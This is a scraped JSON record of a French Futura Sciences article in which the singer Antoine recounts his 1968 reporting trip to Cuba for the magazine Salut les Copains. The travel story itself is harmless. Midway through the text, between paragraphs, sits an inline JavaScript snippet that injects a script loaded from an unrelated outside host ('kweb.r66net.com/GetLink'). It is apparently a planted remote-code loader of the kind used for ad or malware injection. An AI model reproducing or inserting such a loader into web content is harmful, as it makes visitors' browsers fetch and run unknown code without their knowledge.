{"title": "1968 : l'etonnant reportage d'Antoine a Cuba pour Salut les Copains", "newspaper": "Futura Sciences", "author": ["Antoine"], "date_publi": "2017-11-06", "content": "Cette annee 2017, j'ai realise mon septieme voyage a Cuba... De 1968 a 2017, j'ai visite l'ile en avion, en voilier, et, cette annee, a bord d'une de ces magnifiques voitures americaines des annees cinquante qui font desormais partie du patrimoine cubain. Au fil des annees, j'ai vu evoluer ce pays fascinant. A l'occasion de la publication par Warner Home Video de notre film  Cuba est une Fete , je vous propose de revivre avec moi chacun de ces voyages. Futura diffusera sept episodes, et publiera un diaporama et des clips video. De quoi flaner a Cuba jusqu'a Noel ! Dans les annees soixante, le legendaire magazine  Salut les Copains , alias SLC, ne reculait devant aucune depense pour faire rever ses lecteurs, et emmenait chaque mois une grande vedette de la  chanson , Claude Francois, Sylvie Vartan, Hugues Aufray ou d'autres, dans un pays lointain qui l'attirait, Japon, Californie, Bresil... Ces invites devaient rapporter de somptueux reportages photographiques, signes Jean-Marie Perier, Tony Frank, Benjamin Auger, intitules  Bons baisers de... . Pendant une semaine, Antoine a ete l'invite de cette etonnante republique de la mer des Antilles ou le portrait de Che Guevara prend la valeur d'un second embleme national. (c) Antoine, DR                               Dans ces annees gaullistes, cependant, il n'aurait ete politiquement correct pour aucune des << idoles >> adulees de SLC de rendre visite a un pays communiste. Ma chanson  Les Elucubrations  ou je reclamais entre autres la vente de la pilule dans les Monoprix etant plutot politiquement incorrecte, le magazine m'avait propose un reportage en  URSS  ; j'avais accepte, mais malheureusement les visas nous furent refuses au dernier moment et nous avons donc change de direction. Un jour du printemps 1968, nous avons pris l'avion pour  Cuba , ou la Revolution survenue neuf ans plus tot avait mis a mal le tourisme, et ou le gouvernement cherchait a faire revenir, a defaut des visiteurs americains a qui le gouvernement des Etats-Unis refusait tout voyage a Cuba, du moins ceux des pays d'Europe, et ceci malgre le blocus mis en place par l'Amerique. Quand je suis arrive, Fidel Castro avait requisitionne tous les Cubains et moi-meme pour travailler aux champs. (c) Antoine, DR                               Quand la canne a sucre etait la richesse de Cuba C'est ainsi que nous nous sommes retrouves dans la capitale de l'ile, La Havane, dans un des vastes hotels datant de l'ere precedente, l'hotel Nacional, nationalise, comme pratiquement tous les biens, par le Commandante Fidel Castro.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les rues de La Havane etaient presque desertes et le service l'hotel terriblement lent. Devant les difficultes economiques induites par la revolution et le blocus, le gouvernement incitait en permanence, sur les ondes de la  radio  nationale, tous les Cubains, y compris les fonctionnaires et les enseignants, a quitter la ville pour aller contribuer a la coupe de la  canne a sucre . Vue sur l'arrivee de l'hotel Nacional, La Havane. (c) Antoine, DR                               Vendue a l'URSS, elle constituait pratiquement la seule facon pour Cuba d'acquerir des devises. Nous avons nous aussi pris la route, sur une autoroute quasi-deserte, a l'exception de camions surcharges de dizaines de citoyens repondant a la croisade du gouvernement, et de quelques charrettes a cheval. Outre La Havane et les plages voisines, nous avons aussi rendu visite a un petit groupe d'ilots situes au centre d'une lagune, a quelques heures de route de la capitale, la Laguna  del  Tesoro. On y a reconstitue un village traditionnel, une facon de rendre hommage aux premiers habitants de l'ile, les  Indiens Taino . Hommage bien tardif puisque moins de vingt ans apres la decouverte de l'ile par  Christophe Colomb  en 1492, plus de 90 % des Indiens avaient ete extermines par l'envahisseur espagnol. Dans les champs de canne a sucre. (c) Antoine, DR                               La lagune des crocodiles La lagune est bordee d'un elevage de  crocodiles , et je me rappelle avoir vu le photographe de SLC, Benjamin, reculer pour mieux cadrer sa photo et tomber dans l'eau de la lagune, d'ou ne depassaient que ses mains et le lourd appareil photo. Nous l'avons repeche en quatrieme  vitesse  avant l'arrivee d'un  saurien  ! Accables par la crise, mais toujours souriants et souvent enthousiastes, les Cubains nous avaient bien accueillis. Nous sommes repartis avec l'intention de revenir bien vite dans cette ile fascinante (il me faudrait pourtant attendre 18 ans pour y retourner, sur mon premier voilier). Antoine avec les joueurs de maracas. (c) Antoine, DR                               Dans mes bagages, outre quelques pamphlets politiques et des cigares que nous avions vu rouler a la grande fabrique, elle aussi nationalisee, j'emportais un amusant souvenir, 100 % naturel : un de ces longs << haricots >>, fruits des magnifiques  arbres  appeles flamboyants, et que les Cubains, qui pratiquaient assidument le systeme D, employaient, apres les avoir fait secher, comme instruments de percussion, un peu comme les maracas. Dans mon succes de cette annee-la, la chanson  Bonjour Salut , diffusee sur les radios francaises precisement au moment ou commencaient les evenements de mai 1968, resonnait, secretement, un peu de la voix de l'ile revolutionnaire de Cuba. A bientot pour la prochaine etape : 1986 sur le sloop  Voyage , mon second bateau lance en 1981. Voir aussi : Chronique : Avec Antoine, decouvrez les Grenadines, Sainte-Lucie, Saint-Vincent... ", "theme": "planete"}